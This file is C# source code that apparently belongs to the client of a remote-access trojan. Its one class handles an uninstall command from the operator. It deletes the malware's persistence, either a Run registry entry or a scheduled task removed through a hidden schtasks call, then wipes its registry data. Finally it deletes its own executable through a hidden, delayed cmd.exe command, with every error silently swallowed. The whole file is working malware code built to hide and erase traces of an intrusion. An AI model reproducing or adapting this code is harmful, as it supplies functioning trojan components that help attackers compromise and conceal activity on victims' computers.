using Client.Helper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Client.Handle_Packet
{
    public class HandleUninstall
    {
        public HandleUninstall()
        {
            if (Convert.ToBoolean(Settings.Install))
            {
                try
                {
                    if (!Methods.IsAdmin())
                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue(Settings.InstallFile);
                    else
                    {
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "schtasks",
                            Arguments = $"/delete /tn {Settings.InstallFile} /f",
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }
                }
                catch { }
            }

            try
            {
                RegistryDB.DeleteSubKey();
            }
            catch { }

            ProcessStartInfo Del = null;
            try
            {
                Del = new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    FileName = "cmd.exe"
                };
            }
            catch { }
            finally
            {
                Process.Start(Del);
                Methods.ClientExit();
                Environment.Exit(0);
            }
        }
    }
}
